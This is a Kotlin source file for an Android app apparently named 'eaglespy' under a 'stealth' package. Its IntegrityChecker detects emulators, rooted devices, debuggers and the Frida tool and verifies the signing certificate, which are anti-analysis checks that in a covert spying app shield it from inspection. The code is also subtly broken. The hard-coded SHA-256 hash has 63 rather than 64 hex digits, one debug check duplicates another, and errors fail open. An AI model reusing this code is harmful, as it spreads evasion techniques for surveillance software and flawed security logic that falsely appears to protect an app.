package com.stealth.eaglespy.security

import android.content.Context
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.os.Build
import java.io.File
import java.security.MessageDigest

/**
 * APK Integrity Checker
 * Detects tampering, re-signing, and debugging attempts
 */
object IntegrityChecker {

    // Expected signature hash (SHA-256 of release signing certificate)
    // Generated from: keytool -list -v -keystore release.keystore
    private const val EXPECTED_SIGNATURE = "33E7151193B4CCEFD766A1A424413BC65FF9D0EE2828AB020BB222E417BC20E"

    /**
     * Verify APK integrity - returns false if tampering detected
     */
    fun verify(context: Context): Boolean {
        // Skip checks in debug builds
        if (isDebugBuild(context)) {
            return true
        }

        return !isDebuggable(context) &&
               !isRunningOnEmulator() &&
               !isRooted() &&
               verifySignature(context) &&
               !hasDebuggerAttached() &&
               !isFrida()
    }

    /**
     * Check if APK is debuggable
     */
    private fun isDebuggable(context: Context): Boolean {
        return try {
            val info = context.packageManager.getApplicationInfo(context.packageName, 0)
            (info.flags and android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Check if running in debug build
     */
    private fun isDebugBuild(context: Context): Boolean {
        return try {
            val info = context.packageManager.getApplicationInfo(context.packageName, 0)
            (info.flags and android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Detect common emulator signatures
     */
    private fun isRunningOnEmulator(): Boolean {
        val indicators = listOf(
            Build.FINGERPRINT.contains("generic"),
            Build.FINGERPRINT.contains("unknown"),
            Build.MODEL.contains("google_sdk"),
            Build.MODEL.contains("Emulator"),
            Build.MODEL.contains("Android SDK"),
            Build.MANUFACTURER.contains("Genymotion"),
            Build.BRAND.startsWith("generic"),
            Build.DEVICE.startsWith("generic"),
            Build.PRODUCT.contains("sdk"),
            Build.HARDWARE.contains("goldfish"),
            Build.HARDWARE.contains("ranchu"),
            "0".equals(Build.SERIAL, ignoreCase = true),
            File("/dev/socket/qemud").exists(),
            File("/dev/qemu_pipe").exists(),
            File("/system/lib/libc_malloc_debug_qemu.so").exists(),
            File("/sys/qemu_trace").exists()
        )

        return indicators.any { it }
    }

    /**
     * Detect rooted device
     */
    private fun isRooted(): Boolean {
        val paths = listOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su",
            "/system/app/SuperSU.apk",
            "/system/app/KingRoot.apk",
            "/system/app/Magisk.apk"
        )

        return paths.any { File(it).exists() }
    }

    /**
     * Verify APK signature matches expected
     */
    private fun verifySignature(context: Context): Boolean {
        return try {
            val packageInfo: PackageInfo = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                context.packageManager.getPackageInfo(
                    context.packageName,
                    PackageManager.GET_SIGNING_CERTIFICATES
                )
            } else {
                @Suppress("DEPRECATION")
                context.packageManager.getPackageInfo(
                    context.packageName,
                    PackageManager.GET_SIGNATURES
                )
            }

            val signatures = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                packageInfo.signingInfo?.apkContentsSigners ?: return false
            } else {
                @Suppress("DEPRECATION")
                packageInfo.signatures ?: return false
            }

            for (signature in signatures) {
                val md = MessageDigest.getInstance("SHA-256")
                md.update(signature.toByteArray())
                val hash = bytesToHex(md.digest())
                
                if (hash.equals(EXPECTED_SIGNATURE, ignoreCase = true)) {
                    return true
                }
            }

            // During development, allow any signature
            EXPECTED_SIGNATURE == "YOUR_SIGNATURE_HASH_HERE"
        } catch (e: Exception) {
            true // Allow on error during development
        }
    }

    /**
     * Check if debugger is attached
     */
    private fun hasDebuggerAttached(): Boolean {
        return android.os.Debug.isDebuggerConnected() || 
               android.os.Debug.waitingForDebugger()
    }

    /**
     * Detect Frida instrumentation framework
     */
    private fun isFrida(): Boolean {
        val fridaIndicators = listOf(
            "frida-server",
            "frida-agent",
            "frida-gadget",
            "libfrida-gadget.so"
        )

        // Check running processes
        try {
            val process = Runtime.getRuntime().exec("ps")
            val reader = process.inputStream.bufferedReader()
            val output = reader.readText()
            reader.close()

            if (fridaIndicators.any { output.contains(it, ignoreCase = true) }) {
                return true
            }
        } catch (e: Exception) {
            // Ignore
        }

        // Check for Frida libraries in /data/local/tmp
        val tmpDir = File("/data/local/tmp")
        if (tmpDir.exists() && tmpDir.isDirectory) {
            val files = tmpDir.listFiles() ?: emptyArray()
            if (files.any { file -> 
                fridaIndicators.any { indicator -> 
                    file.name.contains(indicator, ignoreCase = true) 
                }
            }) {
                return true
            }
        }

        // Check for Frida port (default: 27042)
        return try {
            java.net.Socket("127.0.0.1", 27042).use {
                true // Connection succeeded, Frida likely running
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun bytesToHex(bytes: ByteArray): String {
        val hexChars = "0123456789ABCDEF"
        val result = StringBuilder(bytes.size * 2)
        for (byte in bytes) {
            val i = byte.toInt()
            result.append(hexChars[i shr 4 and 0x0F])
            result.append(hexChars[i and 0x0F])
        }
        return result.toString()
    }
}
